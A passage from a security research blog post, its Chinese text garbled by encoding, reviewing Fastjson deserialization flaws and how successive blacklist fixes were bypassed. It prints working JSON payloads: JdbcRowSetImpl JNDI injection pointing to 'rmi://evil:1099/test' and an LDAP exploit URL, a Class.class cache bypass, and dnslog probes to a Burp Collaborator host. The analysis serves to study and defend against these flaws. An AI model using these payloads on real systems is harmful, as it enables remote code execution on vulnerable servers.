<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"rmi://evil:1099/test"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
<p>è¿˜æœ‰å¾ˆå¤šå…¶ä»–çš„å¯ä»¥ç”¨æ¥JNDIæ³¨å…¥çš„å¯¹è±¡ï¼Œæ¯”å¦‚<code>org.hibernate.jmx.StatisticsService</code>çš„<code>setSessionFactoryJNDIName</code>å‡½æ•°ï¼ŒåŸç†ä¸€æ ·ä¸å†å™è¿°ã€‚</p>
<h2 id="3-Tomcat-dbcp-BasicDataSource"><a href="#3-Tomcat-dbcp-BasicDataSource" class="headerlink" title="(3). Tomcat dbcp BasicDataSource"></a>(3). Tomcat dbcp BasicDataSource</h2><p>åŒ1ä¸­çš„TemplateImplï¼ŒBasicDataSourceä¹Ÿå¯ä»¥è½½å…¥ä»»æ„çš„å¯¹è±¡æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚å…ˆæ¥è®²ä¸€ä¸‹ä»–çš„åŸç†</p>
<p>å‰é¢çš„åŸºç¡€çŸ¥è¯†é‡Œæåˆ°äº†æˆ‘ä»¬å¯ä»¥è°ƒç”¨ç¬¦åˆæ¡ä»¶çš„gettersï¼Œåœ¨<code>BasicDataSource</code>å­˜åœ¨ä¸€ä¸ª<code>getConnection</code>å‡½æ•°ï¼Œä»–ä¸»è¦è°ƒç”¨<code>createConnectionFactory</code></p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411132559759.png" alt="image-20200411132559759"></p>
<p>åœ¨<code>createConnectionFactory</code>å‡½æ•°ä½¿ç”¨Class.forNameåŠ è½½ç±»</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411132736300.png" alt="image-20200411132736300"></p>
<p>è¿™éƒ¨åˆ†driverClassNameå’ŒdriverClassLoaderæ˜¯å¯æ§çš„ï¼Œè¿™æ—¶å€™æˆ‘ä»¬è¦ç”¨åˆ°çš„æ˜¯<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>ï¼Œè¿™ä¸ªClassLoaderå¯ä»¥ä»classnameä¸­æå–å‡ºBCELæ ¼å¼çš„classå­—èŠ‚ç ï¼Œå¹¶è°ƒç”¨defineClassè¿›è¡Œè½½å…¥</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411134429055.png" alt="image-20200411134429055"></p>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªç”¨äº†é™æ€å—çš„ç±»æ¥æ‰§è¡Œä»£ç ã€‚</p>
<h1 id="0x03-Fastjsonå†å²ç‰ˆæœ¬ä¿®å¤æªæ–½"><a href="#0x03-Fastjsonå†å²ç‰ˆæœ¬ä¿®å¤æªæ–½" class="headerlink" title="0x03 Fastjsonå†å²ç‰ˆæœ¬ä¿®å¤æªæ–½"></a>0x03 Fastjsonå†å²ç‰ˆæœ¬ä¿®å¤æªæ–½</h1><hr>
<p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦è®²è¿°å‡ ä¸ªé‡è¦ç‰ˆæœ¬çš„å®‰å…¨æ›´æ–°</p>
<h3 id="1-fastjson-1-2-25"><a href="#1-fastjson-1-2-25" class="headerlink" title="(1). fastjson == 1.2.25"></a>(1). fastjson == 1.2.25</h3><p>é»˜è®¤å…³é—­<code>AutoType</code>ï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯<code>@type</code>çš„æ”¯æŒï¼Œè§<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">enable_autotype</a></p>
<p><code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200411232403665.png" alt="image-20200411232403665"></p>
<p>å½“é‡åˆ°<code>@type</code>æ—¶ï¼Œä¼šå…ˆ<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code>ã€‚è¯¥å‡½æ•°çš„ä¸€ä¸ªä¸»è¦é€»è¾‘ï¼ˆ1.2.25ç‰ˆæœ¬ï¼‰</p>
<ol>
<li><p>å¼€å¯äº†<code>AutoType</code>æ—¶ï¼Œä¼šè¿‡ä¸€æ¬¡é»‘åå•å’Œç™½åå•æ£€æµ‹ï¼ˆå…ˆæ£€æµ‹ç™½åå•ï¼Œåæ£€æµ‹é»‘åå•ï¼‰ã€‚</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200412223524510.png" alt="image-20200412223524510"></p>
<p>ä¼˜å…ˆè½½å…¥äººå·¥é…ç½®çš„ç™½åå•ç±»ï¼Œå¹¶å¯¹é»‘åå•ç±»çˆ†å‡ºå¼‚å¸¸ï¼›</p>
</li>
<li><p>è¿™é‡Œå…ˆå¿½ç•¥æœªå¼€å¯<code>AutoType</code>æ—¶çš„æ£€æµ‹å¤„ç†</p>
</li>
<li><p>å‰é¢çš„æƒ…å†µéƒ½ä¸ç¬¦åˆï¼Œå¹¶ä¸”å¼€å¯äº†<code>AutoType</code>ï¼Œåˆ™å°è¯•å»è½½å…¥ä»»æ„ç±»ï¼Œä½†æ˜¯ä¸å¯ä»¥è½½å…¥ClassLoaderå’ŒDataSourceçš„å­ç±»</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200412224904669.png" alt="image-20200412224904669"></p>
</li>
</ol>
<p>è¿™é‡Œè½½å…¥çš„æ–¹æ³•ç”¨çš„éƒ½æ˜¯<code>TypeUtils.loadClass</code>ï¼Œæ¥çœ‹ä¸€ä¸‹ä»–çš„ä¸€ä¸ªå¤„ç†</p>
<ul>
<li><p>é¦–å…ˆä»–å¯¹äº<code>Lxxx.class.xxx;</code>çš„ç±»è¡¨ç¤ºæ–¹æ³•åš<code>L</code>,<code>;</code>çš„å‰”é™¤ï¼Œé€’å½’è°ƒç”¨loadClasså»è°ƒç”¨å†…éƒ¨çš„å…·ä½“ç±»</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200412232825982.png" alt="image-20200412232825982"></p>
</li>
<li><p>åç»­çš„è°ƒç”¨æ–¹æ³•ä¸ºä½¿ç”¨<code>AppClassLoader.loadClass</code>æˆ–<code>Class.forName</code>å»åŠ è½½ç±»</p>
</li>
</ul>
<h4 id="å¼€å¯AutoTypeçš„æƒ…å†µä¸‹ç»•è¿‡é»‘åå•æ£€æµ‹"><a href="#å¼€å¯AutoTypeçš„æƒ…å†µä¸‹ç»•è¿‡é»‘åå•æ£€æµ‹" class="headerlink" title="å¼€å¯AutoTypeçš„æƒ…å†µä¸‹ç»•è¿‡é»‘åå•æ£€æµ‹"></a>å¼€å¯<code>AutoType</code>çš„æƒ…å†µä¸‹ç»•è¿‡é»‘åå•æ£€æµ‹</h4><p>æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œå¦‚æœå¼€å¯äº†<code>AutoType</code>ï¼Œé‚£ä¹ˆå¦‚æœæ˜¯åœ¨ç™½åå•é‡Œçš„ç±»ï¼Œç›´æ¥åŠ è½½ï¼Œå¯¹äºåœ¨é»‘åå•å†…çš„ç±»ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚</p>
<p>è€Œé»‘åå•çš„æ£€æµ‹æ–¹å¼æ˜¯å»åŒ¹é…å½“å‰çš„ç±»å<code>class.startsWith(deny)</code></p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200412233730761.png" alt="image-20200412233730761"></p>
<p>è€Œåœ¨è¿™ä¸ªé»‘åå•é‡Œæ˜¾ç„¶å¹¶æ²¡æœ‰è€ƒè™‘åˆ°<code>TypeUtils.loadClass</code>å®ç°ä¸­ï¼Œå¯¹äº<code>Lxxxx.class.xxx;</code>çš„å¤„ç†ã€‚</p>
<p>é€šè¿‡<code>Lxxxxx;</code>çš„æ–¹å¼<code>startsWith</code>æ²¡åŠæ³•æ­£å¸¸åŒ¹é…å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»•è¿‡é»‘åå•çš„æ£€æµ‹ã€‚</p>
<h3 id="2-fastjson-1-2-42"><a href="#2-fastjson-1-2-42" class="headerlink" title="(2). fastjson == 1.2.42"></a>(2). fastjson == 1.2.42</h3><p>åœ¨è¿™ä¸ªç‰ˆæœ¬ï¼Œå¯¹ä¸Šé¢çš„é»‘åå•æ£€æµ‹ç»•è¿‡åšäº†ä¿®å¤ï¼Œå¹¶ä¸”å°†é»‘åå•é‡Œçš„ç±»å‹è¿›è¡Œhashå¤„ç†ï¼Œå¢åŠ äº†åˆ†æéš¾åº¦ï¼›</p>
<p>å¯¹äºå‰é¢<code>Lxxxxx;</code>çš„ç»•è¿‡ï¼Œ42ç‰ˆæœ¬æ·»åŠ äº†ä»¥ä¸‹ä»£ç æ¥å‰”é™¤ï¼ˆå› ä¸ºé»‘åå•å·²ç»å˜æˆäº†hashæ¯”è¾ƒçš„æ–¹å¼ï¼Œè¿™é‡Œ<code>L;</code>éƒ½ä»¥è¿™ç§æ–¹å¼æ¥ç¡®è®¤ï¼‰</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413114125856.png" alt="image-20200413114125856"></p>
<p>ä½†æ˜¯è¿™é‡Œçš„å¤„ç†æ²»æ ‡ä¸æ²»æœ¬ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>LLxxxxx;;</code>è¿™ç§æ–¹å¼å°±å¯ä»¥ç»•è¿‡ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œç”±äºç°åœ¨çš„é»‘åå•å˜æˆäº†hashè®¡ç®—çš„æ–¹å¼ï¼Œç»™æˆ‘ä»¬åˆ†æå¢åŠ äº†ä¸å°‘éš¾åº¦ï¼Œä¸è¿‡æœ‰å¤§ä½¬å¯¹é»‘åå•hashåšäº†è¿˜åŸè§<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">fastjson-blacklist</a></p>
<h3 id="3-fastjson-1-2-43"><a href="#3-fastjson-1-2-43" class="headerlink" title="(3). fastjson == 1.2.43"></a>(3). fastjson == 1.2.43</h3><p>è¿™ä¸ªç‰ˆæœ¬ä¸»è¦ä¿®å¤äº†ä¸Šé¢<code>LLxxxx;;</code>çš„æ–¹å¼</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413125108171.png" alt="image-20200413125108171"></p>
<p>åšäº†ä¸¤æ¬¡æ£€æµ‹ï¼Œå¦‚æœç¢°ä¸Š<code>LLxxxxx;;</code>çš„æ–¹å¼åˆ™ç›´æ¥çˆ†å‡ºå¼‚å¸¸</p>
<h3 id="4-fastjson-1-2-48"><a href="#4-fastjson-1-2-48" class="headerlink" title="(4). fastjson == 1.2.48"></a>(4). fastjson == 1.2.48</h3><h4 id="ä¿®å¤å‰çš„ç‰ˆæœ¬"><a href="#ä¿®å¤å‰çš„ç‰ˆæœ¬" class="headerlink" title="ä¿®å¤å‰çš„ç‰ˆæœ¬"></a>ä¿®å¤å‰çš„ç‰ˆæœ¬</h4><p>åœ¨48ç‰ˆæœ¬ä¹‹å‰ï¼Œ<code>checkAutoType</code>è¿˜å­˜åœ¨è¿™æ ·ä¸€ä¸ªé€»è¾‘ï¼ˆä»¥1.2.47ä¸ºä¾‹ï¼‰</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413130933666.png" alt="image-20200413130933666"></p>
<p>å½“å¼€å¯<code>AutoType</code>æ—¶ï¼Œå¦‚æœmappingsé‡Œé¢å­˜åœ¨è¿™ä¸ªç±»ï¼Œé‚£ä¹ˆå°±ç®—è¿™ä¸ªç±»åœ¨é»‘åå•é‡Œï¼Œä¹Ÿå…è®¸ä»–è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œ</p>
<p>PSï¼šè¿™é‡Œçš„mappingsæ˜¯fastjsonææ—©è½½å…¥çš„ä¸€äº›ç¼“å­˜ç±»</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413131026571.png" alt="image-20200413131026571"></p>
<p>åç»­å¦‚æœèƒ½ä»mappingsé‡Œé¢å¾—åˆ°è¿™ä¸ªç±»ï¼Œå°±ç›´æ¥è¿”å›ã€‚é‚£ä¹ˆæˆ‘ä»¬æœ‰æ²¡æœ‰ä»€ä¹ˆæ–¹æ³•å°†æˆ‘ä»¬éœ€è¦çš„ç±»åŠ å…¥åˆ°è¿™ä¸ªmappingsé‡Œå‘¢ï¼Ÿ</p>
<p>å…ˆæ¥çœ‹ä¸€ä¸‹<code>deserializers.findClass</code>ï¼Œåœ¨<code>deserializers</code>é‡Œé¢é¢„å…ˆå¡«å……äº†ä¸€äº›ç±»ä¸å…¶ååºåˆ—åŒ–å™¨çš„å®ä¾‹</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413131650373.png" alt="image-20200413131650373"></p>
<p>è¿™é‡Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸€ä¸‹<code>Class.class</code>ï¼Œä»–æ‰€å¯¹åº”çš„ååºåˆ—åŒ–å™¨ä¸º<code>MiscCodec</code>ï¼Œ<code>checkAutoType</code>æ£€æµ‹è¿‡åï¼Œåç»­å°†è°ƒç”¨ååºåˆ—åŒ–å™¨çš„<code>deserialze</code>å‡½æ•°ã€‚æ¥çœ‹çœ‹MiscCodecçš„è¿™ä¸ªå‡½æ•°å¯¹äº<code>Class.class</code>çš„å¤„ç†</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413132337804.png" alt="image-20200413132337804"></p>
<p>ä»–è°ƒç”¨äº†<code>TypeUtils.loadClass</code>å‡½æ•°ï¼Œå‰é¢æˆ‘ä»¬è®²è¿‡ï¼Œä»–å°†ä½¿ç”¨<code>ClassLoader.loadClass</code>æˆ–<code>Class.forName</code>æ¥è½½å…¥ç±»ï¼Œåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œæ¶‰åŠåˆ°äº†<code>mappings</code>çš„æ“ä½œ</p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413132644597.png" alt="image-20200413132644597"></p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413132704804.png" alt="image-20200413132704804"></p>
<p>è¿™é‡Œçš„<code>cache</code>é»˜è®¤ä¸º<code>true</code>ï¼Œæ‰€ä»¥è¿™é‡Œä¼šç›´æ¥å°†è½½å…¥åçš„å¯¹è±¡å¡«å…¥<code>mappings</code></p>
<p>æ ¹æ®æˆ‘ä»¬å‰é¢çš„åˆ†æï¼Œå¦‚æœå½“å‰<code>mappings</code>é‡Œå­˜åœ¨å¯æ§çš„ç±»ï¼Œé‚£ä¹ˆä¸ç®¡å¼€æ²¡å¼€å¯<code>AutoType</code>ï¼Œéƒ½ä¼šè¿›è¡Œç±»è¿˜åŸï¼›åŒæ—¶æˆ‘ä»¬åˆ©ç”¨<code>Class.class</code>å¯ä»¥å‘<code>mappings</code>å¡«å……ä»»æ„ç±»ï¼Œè¿™å¯¼è‡´ç»•è¿‡äº†å‰é¢çš„æ£€æµ‹ï¼›</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¸¾ä¸ªä¾‹å­</span></span><br><span class="line">json = <span class="string">"&#123;"</span> + <span class="comment">// ç”¨Classè½½å…¥com.sun.rowset.JdbcRowSetImplï¼Œå¹¶ç¼“å­˜åˆ°mappings</span></span><br><span class="line">          <span class="string">"&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,"</span> +</span><br><span class="line">  					<span class="comment">// åç»­ä½¿ç”¨mappingsé‡Œçš„com.sun.rowset.JdbcRowSetImplæ¥è¿˜åŸå¯¹è±¡</span></span><br><span class="line">          <span class="string">"&#123;\"@type\": \"com.sun.rowset.JdbcRowSetImpl\","</span> +</span><br><span class="line">          <span class="string">"\"dataSourceName\": \"ldap://localhost:1389/Exploit\","</span> +</span><br><span class="line">          <span class="string">"\"autoCommit\": true&#125;"</span> +</span><br><span class="line">        <span class="string">"&#125;"</span>;</span><br></pre></td></tr></table></figure>
<h4 id="ä¿®å¤åçš„ç‰ˆæœ¬"><a href="#ä¿®å¤åçš„ç‰ˆæœ¬" class="headerlink" title="ä¿®å¤åçš„ç‰ˆæœ¬"></a>ä¿®å¤åçš„ç‰ˆæœ¬</h4><p>åœ¨1.2.48ç‰ˆæœ¬ä¸Šå¯¹å…¶è¿›è¡Œäº†ä¿®å¤</p>
<p>åœ¨<code>MiscCodec</code>å¯¹Classçš„å¤„ç†ä¸­ï¼Œä¿®æ”¹äº†<code>cache=false</code></p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413134143022.png" alt="image-20200413134143022"></p>
<p>å¹¶ä¸”å¯¹äº<code>TypeUtils.loadClass</code>é‡Œçš„<code>mappings</code>æ“ä½œéƒ½ä¾èµ–äº<code>cache</code>ï¼Œå¦‚æœä¸º<code>false</code>åˆ™ä¸æ·»åŠ åˆ°<code>mappings</code>é‡Œï¼ˆåœ¨å‰é¢çš„ç‰ˆæœ¬é‡Œ<code>Class.forName</code>éƒ¨åˆ†å¹¶ä¸ä¾èµ–cacheï¼Œ48ç‰ˆæœ¬ä¹‹åå¢åŠ äº†å¯¹cacheçš„åˆ¤æ–­ï¼‰</p>
<p>ä¸æ­¤åŒæ—¶ï¼Œ<code>java.lang.Class</code>ä¹Ÿè¢«åŠ å…¥åˆ°äº†é»‘åå•é‡Œé¢</p>
<h3 id="5-åç»­ç‰ˆæœ¬"><a href="#5-åç»­ç‰ˆæœ¬" class="headerlink" title="(5). åç»­ç‰ˆæœ¬"></a>(5). åç»­ç‰ˆæœ¬</h3><p>åç»­ç‰ˆæœ¬çš„ç»•è¿‡ä¸»è¦å›´ç»•åœ¨ï¼š</p>
<ul>
<li>å¼€å¯<code>AutoType</code>ï¼Œç»•è¿‡é»‘åå•æ£€æµ‹</li>
<li>åˆ©ç”¨<code>deserializers</code>é‡Œé¢çš„ç±»(è·Ÿ<code>Class.class</code>ä¸€ä¸ªåŸç†)</li>
</ul>
<p>æœ€æ–°ç‰ˆ1.2.68å¼•å…¥äº†<a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode" target="_blank" rel="noopener">safeMode</a>ï¼Œåœ¨<code>checkAutoType</code>é‡Œæ·»åŠ äº†ä¸‹é¢åˆ¤æ–­ï¼Œå¦‚æœå¼€å¯äº†safemodeï¼Œé‚£ä¹ˆå°†ä¸å…è®¸è¿›è¡Œ<code>@type</code></p>
<p><img src="/images/talk-about-fastjson-deserialization-20200413/image-20200413161935377.png" alt="image-20200413161935377"></p>
<p>ä¸è¿‡è¿™ä¸ªå¹¶ä¸æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œéœ€è¦äººå·¥å»é…ç½®ã€‚</p>
<h3 id="6-åç»­ç‰ˆæœ¬è§‰å¾—æœ‰æ„æ€çš„åˆ©ç”¨"><a href="#6-åç»­ç‰ˆæœ¬è§‰å¾—æœ‰æ„æ€çš„åˆ©ç”¨" class="headerlink" title="(6). åç»­ç‰ˆæœ¬è§‰å¾—æœ‰æ„æ€çš„åˆ©ç”¨"></a>(6). åç»­ç‰ˆæœ¬è§‰å¾—æœ‰æ„æ€çš„åˆ©ç”¨</h3><ul>
<li><p>fastjson &lt; 1.2.60 dos <a href="http://m0d9.me/2019/09/06/Fastjson-1-2-60-Dosåˆ†æ/" target="_blank" rel="noopener">Fastjson-1-2-60-Dos</a></p>
</li>
<li><p>ä½¿ç”¨dnslogæ¥æ£€æµ‹fastjsonæ¼æ´ <a href="https://github.com/alibaba/fastjson/issues/3077" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/issues/3077</a></p>
<p>è¿™é‡Œçš„åŸç†è·Ÿ<code>Class.class</code>æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯æ¢æˆäº†<code>java.net.URL</code>ã€<code>java.net.Inet4Address</code>ã€<code>java.net.Inet6Address</code>ï¼Œç”±MiscCodecå¤„ç†æ—¶ä¼šå»è§¦å‘dnsæŸ¥è¯¢</p>
<p>å½“ç„¶è¿™é‡Œçš„è§¦å‘URLçš„è§¦å‘ç”¨çš„ysoserialé‡Œé¢çš„URLDNSçš„æ–¹å¼ï¼Œç”±hashcodeå»è§¦å‘ï¼›</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://s81twxdise25yxjinqaar74iq9wzko.burpcollaborator.net&quot;&#125;:&quot;aaa&quot;&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h1><hr>
<p>åˆ°è¿™é‡Œfastjsonç›¸å…³çš„çŸ¥è¯†ç‚¹å°±æ¢³ç†ç»“æŸäº†ï¼Œè¿™å…¶ä¸­å¼€å‘è€…ä¸å®‰å…¨ç ”ç©¶äººå‘˜çš„æ”»é˜²äº¤äº’çœŸæ˜¯ä»¤äººç§°å¿«ï¼åç»­å¦‚æœæœ‰å…¶ä»–çš„ç»•è¿‡ï¼Œè¿˜ä¼šç»§ç»­å†™ä¸‹å»ã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹fastjsonåˆ©ç”¨ä¸­çš„ç‰¹è‰²ï¼š</p>
<ul>
<li>ååºåˆ—åŒ–æ—¶ä¸»åŠ¨è§¦å‘ç¬¦åˆæ¡ä»¶çš„setterså’Œgettersï¼Œå…¶ä¸­ä½¿ç”¨parseå’ŒparseObjectå‡½æ•°ï¼Œåœ¨getteråˆ©ç”¨ä¸ŠparseObjectçš„é™åˆ¶æ›´ä½ä¸€ç‚¹ï¼›ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æœ¬æ–‡çš„ä¸¤ç§æ–¹æ³•å°†parseçš„è°ƒç”¨æ•ˆæœè½¬åŒ–ä¸ºparseObject</li>
<li><code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>æ˜¯ä¸ªå¥½ä¸œè¥¿</li>
<li>fastjsonçš„é»‘åå•ç»•è¿‡æ¥çœ‹ï¼ŒåŸºæœ¬ä¸Šæ‰¾çš„éƒ½æ˜¯jndiç›¸å…³çš„åˆ©ç”¨ï¼Œæˆ–è®¸å¯ä»¥æ‰©å±•ä¸€äº›å…¶ä»–çš„ï¼Ÿ</li>
<li>æœ‰æ—¶å€™å¼€å‘è€…ç†è§£ä¸åˆ°ä½ï¼Œæ‰“å¾—è¡¥ä¸å¯ä»¥è½»æ¾è¢«ç»•è¿‡ï¼Œæ‰€ä»¥éœ€è¦ç´§ç›¯è¡¥ä¸çš„æƒ…å†µ</li>
</ul>

  	</div>
	  
	  <div class="article-tags tags">
      
        <a href="/tags/vul/">vul</a>
      
	  </div>
    

	
		<div class="art-item-footer">
				
					<span class="art-item-left"><i class="icon icon-chevron-thin-left"></i>prevï¼š<a href="/2020/04/18/java/talk-about-xstream-deserialization/" rel="prev"  title="ã€notesã€‘å›é¡¾XStreamååºåˆ—åŒ–æ¼æ´">
						ã€notesã€‘å›é¡¾XStreamååºåˆ—åŒ–æ¼æ´
					</a></span>
				
				
					<span class="art-item-right">nextï¼š<a href="/2020/03/10/java/java-jmx-rmi/" rel="next"  title="ã€notesã€‘æ”»å‡»Java JMX-RMI">
						ã€notesã€‘æ”»å‡»Java JMX-RMI
					</a><i class="icon icon-chevron-thin-right"></i></span>
				
		</div>
	
	</section>
	
		<section id="comments">
			<div id="disqus_thread"></div>
		</section>
	
</article>
<script>
	window.subData = {
		title: 'ã€notesã€‘æµ…è°ˆfastjsonååºåˆ—åŒ–æ¼æ´',
		tools: true
	}
</script>

      </div>
      <aside class='l_side'>
        
  <section class='m_widget about'>

<div class='header'>wh1t3p1g</div>
<div class='content'>
<div class='desc'>A Web ğŸ¶ &amp;&amp; Code Reviewer</div>
</div>
</section>

  <section class='m_widget links'>
<div class='header'>Links</div>
<div class='content'>
    <ul class="entry">
    
        <li><a class="flat-box" target="_blank" href="http://blog.orleven.com">
            <div class='name'>orleven</div>
        </a></li>
    
        <li><a class="flat-box" target="_blank" href="http://www.warmeng.com">
            <div class='name'>warmeng</div>
        </a></li>
    
    </ul>
</div>
</section>

  <section class='m_widget categories'>
<div class='header'>Categories</div>
<div class='content'>
    
    <ul class="entry">
    
        <li><a class="flat-box" href="/categories/codereview/"><div class='name'>codereview</div><div class='badget'>10</div></a></li>
    
        <li><a class="flat-box" href="/categories/ctf/"><div class='name'>ctf</div><div class='badget'>6</div></a></li>
    
        <li><a class="flat-box" href="/categories/notes/"><div class='name'>notes</div><div class='badget'>24</div></a></li>
    
    </ul>
    
</div>
</section>

  
<div class="m_widget tagcloud">
    <div class="header">Tags</div>
    <div class='content'>
        <a href="/tags/bctf/" style="font-size: 14px; color: #808080">bctf</a> <a href="/tags/cms/" style="font-size: 18.5px; color: #202020">cms</a> <a href="/tags/ctf/" style="font-size: 14px; color: #808080">ctf</a> <a href="/tags/cve/" style="font-size: 17px; color: #404040">cve</a> <a href="/tags/ddctf/" style="font-size: 14px; color: #808080">ddctf</a> <a href="/tags/hitbxctf/" style="font-size: 14px; color: #808080">hitbxctf</a> <a href="/tags/mobile/" style="font-size: 14px; color: #808080">mobile</a> <a href="/tags/njctf/" style="font-size: 14px; color: #808080">njctf</a> <a href="/tags/others/" style="font-size: 15.5px; color: #606060">others</a> <a href="/tags/suctf/" style="font-size: 14px; color: #808080">suctf</a> <a href="/tags/vul/" style="font-size: 20px; color: #000">vul</a>
    </div>
</div>



      </aside>
      <script>setLoadingBarProgress(60);</script>
    </div>
  </div>
  <footer id="footer" class="clearfix">

	<div class="social-wrapper">
  	
      
        <a href="https://github.com/wh1t3p1g" class="social github"
          target="_blank" rel="external">
          <span class="icon icon-github"></span>
        </a>
      
        <a href="/atom.xml" class="social rss"
          target="_blank" rel="external">
          <span class="icon icon-rss"></span>
        </a>
      
    
  </div>
  
  <div>Theme <a href='https://github.com/stkevintan/hexo-theme-material-flow' class="codename">MaterialFlow</a> designed by <a href="http://keyin.me/" target="_blank">Kevin Tan</a>.</div>
  
</footer>


  <script>setLoadingBarProgress(80);</script>
  
<script>
  var disqus_shortname = '0kami';
  
  var disqus_url = 'http://blog.0kami.cn/2020/04/13/java/talk-about-fastjson-deserialization/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src='//cdn.bootcss.com/node-waves/0.7.5/waves.min.js'></script>
<script src="//cdn.bootcss.com/scrollReveal.js/3.3.2/scrollreveal.min.js"></script>
<script src="/js/jquery.fitvids.js"></script>
<script>
	var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
	var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
	var ALGOLIA_API_KEY = "";
	var ALGOLIA_APP_ID = "";
	var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var BAIDU_API_ID = "";
  var SEARCH_SERVICE = "hexo";
  var ROOT = "/"||"/";
  if(!ROOT.endsWith('/'))ROOT += '/';
</script>
<script src="/js/search.js"></script>
<script src="/js/app.js"></script>


  <script>setLoadingBarProgress(100);</script>
</body>
</html>
